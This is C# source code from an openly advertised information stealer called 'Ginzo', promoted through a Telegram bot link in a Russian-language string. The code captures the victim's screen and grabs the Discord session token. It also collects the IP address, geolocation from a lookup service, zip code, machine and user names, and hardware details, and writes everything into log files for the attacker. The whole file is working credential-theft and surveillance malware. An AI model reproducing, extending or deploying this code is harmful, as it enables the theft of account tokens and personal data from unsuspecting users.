using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Management;
using Microsoft.Win32;
using System.Xml;

namespace Ginzo
{
    internal class Information
    {
        public static void Screenshot()
        {
            try
            {
                int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
                int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(Preparing.LogPath + "\\Screenshot.png", ImageFormat.Png);
                Console.WriteLine("Screenshot added on log path");
            }
            catch
            {
                Console.WriteLine("Screenshot NOT added on log path");
            }
        }

        public static void SystemInformation()
        {
            try
            {
                string AboutFile = ("Бесплатный стиллер Ginzo: https://t.me/ginzostealer_bot \n\nIP адрес: " + GetIP() + "\nМестоположение: " + Country() + ", " + City() + "\nИндекс: " + Zipcode() + "\n\nОперационная система: " + GetWindowsVersionName() + " " + GetBitVersion() + "\nНазвание компьютера: " + Environment.MachineName + "\nИмя пользователя: " + Environment.UserName + "\nРазрешение экрана: " + ScreenMetrics() + "\n\nВидеокарта: " + GetGpuName() + "\nПроцессор: " + GetCPUName() + "\nОперативная память: " + GetRAM() + "\n\nВремя запуска: " + DateTime.Now);
                File.WriteAllText(Preparing.LogPath + "\\System.txt", AboutFile);
                Console.WriteLine("System about file has been created");
            } catch { }
        }

        public static string Zipcode()
        {
            if (Information.check == true)
            {
                string zipcode = Information.GEOIPAPP.GetElementsByTagName("ZipCode")[0].InnerText;
                if (zipcode.Length < 1)
                {
                    return "неизвестно";
                }
                else { return zipcode; }
            }
            else
            {
                return "не удалось определить индекс";
            }
        }

        public static string City()
        {
            if (Information.check == true)
            {
                string city = Information.GEOIPAPP.GetElementsByTagName("City")[0].InnerText;
                if (city.Length < 1)
                {
                    return "неизвестно";
                } else { return city; }
            }
            else
            {
                return "не удалось определить город";
            }
        }

        public static string Country()
        {
            if (Information.check == true)
            {
                string countryCode = Information.GEOIPAPP.GetElementsByTagName("CountryName")[0].InnerText;
                if (countryCode.Length < 1)
                {
                    return "неизвестно";
                }
                else { return countryCode; }
            }
            else
            {
                return "не удалось определить страну";
            }
        }

        public static void DiscordGetToken()
        {
            try
            {
                string AboutFile = (Discord.Token());
                File.WriteAllText(Preparing.LogPath + "\\Discord.txt", AboutFile);
                Console.WriteLine("Discord session has been grabbed and saved like token");
            }
            catch { Console.WriteLine("Discord session not founded"); }

        }

        public static string GetGpuName()
        {
            try
            {
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
                foreach (ManagementObject mObject in mSearcher.Get())
                    return mObject["Name"].ToString();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            return "Неизвестная модель";
        }

        public static string GetRAM()
        {
            try
            {
                int RamAmount = 0;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    foreach (ManagementObject MO in MOS.Get())
                    {
                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
                        RamAmount = (int)(Bytes / 1048576) - 1;
                        break;
                    }
                }
                return RamAmount.ToString() + "MB";
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return "не удалось определить объем ОЗУ";
            }
        }

        public static string GetCPUName()
        {
            try
            {
                string CPU = string.Empty;
                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
                foreach (ManagementObject mObject in mSearcher.Get())
                {
                    CPU = mObject["Name"].ToString();
                }
                return CPU;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return "Неизвестная модель";
            }
        }

        public static string ScreenMetrics()
        {
            Rectangle bounds = System.Windows.Forms.Screen.GetBounds(Point.Empty);
            int width = bounds.Width;
            int height = bounds.Height;
            return width + "x" + height;
        }

        public static string GetWindowsVersionName()
        {
            string sData = "Неизвестная система";
            try
            {
                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem"))
                {
                    foreach (ManagementObject tObj in mSearcher.Get())
                        sData = Convert.ToString(tObj["Name"]);
                    sData = sData.Split(new char[] { '|' })[0];
                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
                }
            }
            catch
            {
                Console.WriteLine("Error with trying analize system");
            }
            return sData;
        }

        private static string GetBitVersion()
        {
            try
            {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0")
                    .GetValue("Identifier")
                    .ToString()
                    .Contains("x86"))
                    return "(x32 битная)";
                else
                    return "(x64 битная)";
            }
            catch
            {
                Console.WriteLine("Error with trying analize system");
            }
            return "(неизвестная битность системы)";
        }

        public static string GeoIP = "https://freegeoip.app/xml/";
        public static XmlDocument GEOIPAPP = new XmlDocument();
        public static bool check = true;
        public static void DownloadXML()
        {
            try
            {
                GEOIPAPP.LoadXml(new WebClient().DownloadString(GeoIP));
                check = true;
            }
            catch
            {
                Console.WriteLine("Some problems with ethernet");
                check = false;
            }
        }

        public static string GetIP() 
        {
            if (Information.check == true)
            {
                string ip = Information.GEOIPAPP.GetElementsByTagName("IP")[0].InnerText;
                if (ip.Length < 1)
                {
                    return "неизвестно";
                }
                else { return ip; }
            }
            else
            {
                return "не удалось определить IP адрес устройства";
            }
        }
    }
}
